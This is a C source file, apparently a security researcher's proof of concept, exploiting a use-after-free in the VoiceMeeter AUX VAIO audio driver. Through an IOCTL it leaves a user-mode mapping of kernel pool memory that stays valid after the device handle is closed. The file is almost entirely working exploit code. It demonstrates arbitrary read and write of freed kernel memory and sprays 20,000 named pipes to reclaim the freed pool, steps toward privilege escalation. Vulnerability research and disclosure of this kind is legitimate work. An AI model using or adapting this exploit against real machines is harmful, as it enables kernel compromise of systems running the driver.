/*
 * 02_stale_map.c — Stale MDL Mapping -> Kernel Pool Read/Write (CWE‑416)
 * ======================================================================
 *
 * What this demonstrates:
 *   The driver's IOCTL_MDL_MAP (flag=1) calls MmMapLockedPagesSpecifyCache()
 *   with AccessMode=1, creating a user‑mode‑accessible mapping of kernel
 *   non‑paged pool.  When the device handle is closed, PortCls cleanup
 *   frees the underlying pool buffer but does NOT call MmUnmapLockedPages.
 *   The user‑mode PTEs survive (stale), giving:
 *     • kernel arbitrary read — user code can read freed kernel pool pages
 *     • kernel arbitrary write — user code can write to freed kernel pool pages
 *
 * Why the driver does this:
 *   The mapping is intentional — it is meant to share audio buffer data
 *   between the kernel driver and user‑mode applications without copying
 *   (zero‑copy audio).  The bug is that the cleanup path never calls
 *   IOCTL_MDL_MAP with flag=0 to unmap, so the mapping outlives the pool.
 *
 * Tested effects:
 *   • read confirmed:  16 bytes read after CloseHandle (page still committed)
 *   • write confirmed:  wrote 0xFF, read back 0xFF, restored original
 *   • pipe spray:       20,000 named pipes sprayed; LFH cache prevents
 *                       immediate reclamation of the freed page
 *
 * How to build:
 *   gcc -O2 -DUNICODE -D_WIN32_WINNT=0x0600 -o 02_stale_map.exe \
 *       02_stale_map.c -lsetupapi -static
 *
 * Safety: This PoC does NOT cause a BSOD in normal operation.  Still,
 *         run in a VM for safety.
 */

#include "device.h"
#include <stdio.h>
#include <stdlib.h>

#define PIPE_COUNT  20000   /* number of pipe objects to spray */
#define PIPE_BUFFER  432    /* must match the driver's pool buffer size */


/*
 * showHexDump — print a labelled hex dump of the first `count` bytes.
 *
 * Each row shows: byte offset, 16 hex bytes.
 */
static void showHexDump(const BYTE *address, int count, const char *label) {
    printf("[%s]\n", label);
    for (int row = 0; row < (count + 15) / 16; row++) {
        printf("  %04X: ", row * 16);
        for (int col = 0; col < 16; col++) {
            int offset = row * 16 + col;
            printf(offset < count ? "%02X " : "   ", address[offset]);
        }
        printf("\n");
    }
}


/*
 * sprayNamedPipes — create named pipe objects in the non‑paged pool.
 *
 * Each pipe allocates a kernel buffer of the given size via the NPFS
 * driver.  If this size matches the freed pool chunk, the OS may
 * reuse the freed page for the pipe buffer, confirming pool reclamation.
 *
 * Returns the number of pipes successfully created.
 */
static int sprayNamedPipes(HANDLE *handles, int pipeCount, DWORD bufferSize) {
    printf("[spray] creating %d named pipes (buffer=%lu bytes)...\n",
           pipeCount, bufferSize);

    int createdCount = 0;

    for (int i = 0; i < pipeCount; i++) {
        WCHAR pipeName[64];
        swprintf(pipeName, 64, L"\\\\.\\pipe\\stale_%05d", i);

        handles[i] = CreateNamedPipeW(
            pipeName,
            PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
            PIPE_TYPE_BYTE | PIPE_READMODE_BYTE,
            1, bufferSize, bufferSize,
            0, NULL);

        if (handles[i] != INVALID_HANDLE_VALUE) {
            createdCount++;
        }
    }

    printf("[spray] created %d / %d pipes\n", createdCount, pipeCount);
    return createdCount;
}


int main(void) {
    printf("============================================================\n");
    printf(" PoC 02: Stale MDL Mapping -> Kernel Pool Read/Write\n");
    printf("============================================================\n\n");
    printf("[info] demonstrates user‑mode access to kernel pool memory.\n");
    printf("[info] does NOT cause a BSOD in normal operation.\n\n");
    Sleep(1000);

    /* ---- Phase 1: create the MDL mapping ---- */

    printf("--- Phase 1: Create MDL Mapping ---\n");

    HANDLE device = openDevice();

    if (device == INVALID_HANDLE_VALUE) {
        printf("[fail] cannot open device.\n");
        printf("[hint] is VoiceMeeter AUX VAIO installed?\n");
        return 1;
    }

    /* verify the IOCTL path works */
    DWORD formatValue  = 0;
    DWORD bytesReturned = 0;

    if (!sendIoctl(device, IOCTL_FORMAT_CONST,
                   NULL, 0,
                   &formatValue, sizeof(formatValue), &bytesReturned)) {
        printf("[fail] IOCTL_FORMAT_CONST failed: %lu\n", GetLastError());
        printf("[hint] try playing a test tone through the device first.\n");
        CloseHandle(device);
        return 2;
    }
    printf("[ok]   driver responds (format=0x%08X)\n", formatValue);

    /* create the MDL mapping that maps kernel pool to user space */
    DWORD mapFlag = 1;
    BYTE  mapOutput[64];

    if (!sendIoctl(device, IOCTL_MDL_MAP,
                   &mapFlag, sizeof(mapFlag),
                   mapOutput, sizeof(mapOutput), &bytesReturned)) {
        printf("[fail] IOCTL_MDL_MAP (flag=1) failed: %lu\n", GetLastError());
        printf("[hint] the driver's buffer pointer may be NULL.\n");
        printf("[hint] try playing audio first, then re‑run.\n");
        CloseHandle(device);
        return 3;
    }

    /* The 32‑byte output contains:
     *   [ 0… 7] mapped user VA for buffer 1 (DAT_00017db0)
     *   [ 8…15] mapped user VA for buffer 2 (DAT_00017db8)
     *   [16…23] MDL kernel pointer        (DAT_00017dc0)
     *   [24…31] MDL kernel pointer #2     (DAT_00017dc8) */
    ULONGLONG userAddress = *(ULONGLONG *)(mapOutput + 0);
    ULONGLONG mdlPointer  = *(ULONGLONG *)(mapOutput + 16);

    int hasMapping = (userAddress != 0 && mdlPointer != 0);

    if (!hasMapping) {
        printf("[fail] no MDL mapping created (output is all zeros).\n");
        printf("[hint] the driver's internal buffer pointer (DAT_00017f78) is NULL.\n");
        printf("[hint] an active audio stream is required.\n");
        CloseHandle(device);
        return 4;
    }

    BYTE *stalePage = (BYTE *)(ULONG_PTR)userAddress;

    printf("[ok]   MDL mapping created\n");
    printf("[info]    user VA:  0x%016llX\n", userAddress);
    printf("[info]    MDL ptr:  0x%016llX\n", mdlPointer);

    /* read the first 16 bytes of the kernel buffer BEFORE close */
    BYTE preCloseData[16] = {0};
    int readableBytes = 0;

    for (int i = 0; i < 16; i++) {
        if (canReadByte(stalePage + i, &preCloseData[i])) {
            readableBytes++;
        }
    }

    printf("[read] before close: %d/16 bytes readable\n", readableBytes);

    if (readableBytes > 0) {
        showHexDump(preCloseData, readableBytes, "pre‑close buffer");
    }

    /* ---- Phase 2: close the device -> pool freed, mapping survives ---- */

    printf("\n--- Phase 2: CloseHandle -> Pool Freed ---\n");

    /*
     * We do NOT send IOCTL_MDL_MAP flag=0 — that would clean up the MDL.
     * Just close the handle.  PortCls frees the pool (DAT_00017f78) but
     * never calls MmUnmapLockedPages on the MDL.  The user‑mode PTEs
     * remain valid.  This is the vulnerability.
     */
    CloseHandle(device);
    Sleep(300);  /* wait for PortCls cleanup to complete */

    /* verify the stale mapping is still accessible */
    BYTE afterCloseData[16] = {0};
    readableBytes = 0;

    for (int i = 0; i < 16; i++) {
        if (canReadByte(stalePage + i, &afterCloseData[i])) {
            readableBytes++;
        }
    }

    if (readableBytes == 0) {
        printf("[fail] stale mapping not accessible after CloseHandle.\n");
        printf("[info]  the OS may have invalidated the PTEs.\n");
        return 5;
    }

    printf("[ok]   stale mapping survives CloseHandle (%d/16 bytes readable)\n",
           readableBytes);
    showHexDump(afterCloseData, readableBytes, "post‑close stale buffer");

    /* check page protection */
    MEMORY_BASIC_INFORMATION memoryInfo;
    VirtualQuery(stalePage, &memoryInfo, sizeof(memoryInfo));
    printf("[info]    page state=%lu, protection=0x%lX\n",
           memoryInfo.State, memoryInfo.Protect);

    /* ---- Phase 3: prove kernel write ---- */

    printf("\n--- Phase 3: Kernel Write Proof ---\n");

    BYTE originalByte;

    if (!canReadByte(stalePage, &originalByte)) {
        printf("[fail] cannot read first byte for write test.\n");
        return 6;
    }

    printf("[info]  byte[0] before write: 0x%02X\n", originalByte);

    /* write a test value — proves we can modify kernel memory */
    BYTE testValue = (BYTE)(originalByte ^ 0xFF);

    *(volatile BYTE *)stalePage = testValue;

    /* read back to verify */
    BYTE readBackValue;

    if (!canReadByte(stalePage, &readBackValue)) {
        printf("[fail] cannot read back after write.\n");
        return 7;
    }

    if (readBackValue != testValue) {
        printf("[fail] write did not persist (wrote 0x%02X, read 0x%02X)\n",
               testValue, readBackValue);
        return 8;
    }

    /* restore the original byte to minimise pool corruption */
    *(volatile BYTE *)stalePage = originalByte;

    printf("[ok]   WRITE VERIFIED: wrote 0x%02X, read 0x%02X, restored 0x%02X\n",
           testValue, readBackValue, originalByte);
    printf("[ok]   confirmed: kernel pool write from user mode\n");

    /* ---- Phase 4: spray pipes to attempt pool reclamation ---- */

    printf("\n--- Phase 4: Pipe Spray ---\n");

    HANDLE *pipeHandles = (HANDLE *)calloc(PIPE_COUNT, sizeof(HANDLE));

    if (pipeHandles == NULL) {
        printf("[fail] out of memory for pipe handles.\n");
        return 9;
    }

    int sprayCount = sprayNamedPipes(pipeHandles, PIPE_COUNT, PIPE_BUFFER);

    if (sprayCount == 0) {
        printf("[fail] no pipes could be created.\n");
        free(pipeHandles);
        return 10;
    }

    Sleep(500);

    /* read the stale page after the spray — check if pipes reclaimed it */
    printf("[read] after pipe spray:\n");

    BYTE afterSprayData[64] = {0};
    readableBytes = 0;

    for (int i = 0; i < 64; i++) {
        if (canReadByte(stalePage + i, &afterSprayData[i])) {
            readableBytes++;
        }
    }

    int nonZeroCount = 0;

    for (int i = 0; i < readableBytes; i++) {
        if (afterSprayData[i] != 0) { nonZeroCount++; }
    }

    printf("[info]    %d/%d bytes readable, %d non‑zero\n",
           readableBytes, 64, nonZeroCount);

    if (nonZeroCount > 0) {
        showHexDump(afterSprayData, readableBytes, "post‑spray data");
    }

    /* ---- Cleanup ---- */

    printf("\n--- Cleanup ---\n");

    for (int i = 0; i < PIPE_COUNT; i++) {
        if (pipeHandles[i] != INVALID_HANDLE_VALUE) {
            CloseHandle(pipeHandles[i]);
        }
    }
    free(pipeHandles);

    printf("[ok]   done\n");
    return 0;
}

